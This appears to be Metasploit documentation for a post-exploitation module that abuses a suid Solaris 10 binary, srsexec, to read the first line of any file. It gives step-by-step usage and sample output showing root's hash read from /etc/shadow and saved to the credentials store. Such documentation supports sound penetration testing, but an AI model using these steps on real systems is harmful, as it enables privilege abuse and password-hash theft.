## Vulnerable Application

  The vulnerable binary (`srsexec`) is included in the package Sun Remote Services
  Net Connect Software Proxy Core (SUNWsrspx).  The vulnerable versions are
  3.2.3 and 3.2.4, for Solaris 10.  This package was included on the extras/companion CD which
  doesn't seem to available anymore.  `srsexec`'s vulnerability is that it runs with the suid bit set,
  and in debug verbose mode if given a file as input, the first line of that file will be echoed back.
  Common exploitation is to read `/etc/shadow`, to get root's password hash, however any file can be read.

  In lieu of this, a mock application was created in python and is available
  [here](https://github.com/h00die/MSF-Testing-Scripts/blob/master/srsexec).
  Follow the instructions in the python script to install, `argparse` also needs to be sent
  to the Solaris box since pypi.org doesn't accept ssl2/3 which are the only versions in Solaris 10u9.

  The output from `srsexec` and this module is slightly odd.  The first line of the file will be
  after `binaries file line: ` and cut at 20 characters.  If the output is longer than 20 characters,
  then the next line will be the next 20 characters with the first 2 from the previous line repeated.

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Get a user level session
  4. Do: ```use solaris/escalate/srsexec_readline```
  5. Do: ```set session [#]```
  6. Do: ```run```
  7. You should be able to read the first line of a file.
  8. If `/etc/shadow` is selected, check `creds`.

## Options

  **File**

  The file that should have the first line read.  Default is `/etc/shadow` and root's hash will be databased.

## Scenarios

### Solaris 10 u9 with mock binary and python 2.4

```
msf5 post(solaris/escalate/srsexec_readline) > run

[+] 3.2.4 is vulnerable
[+] Output: verify_binary(wsltw)
srsexec: binary_name: wsltw
srsexec: name_buf: wsltw_______________
binaries file line: root:MW7h.vpI1Kq1g:1
binaries file line: :17599::::::
smmsp:NP
Security verification failed for binary: wsltw
see SYSLOG(/var/adm/messages) for errors
[+] Adding root's hash added to credential database.
[*] Post module execution completed
msf5 post(solaris/escalate/srsexec_readline) > creds
Credentials
===========

host  origin        service  public  private        realm  private_type
----  ------        -------  ------  -------        -----  ------------
      1.1.1.1                root    MW7h.vpI1Kq1g         Nonreplayable hash
```
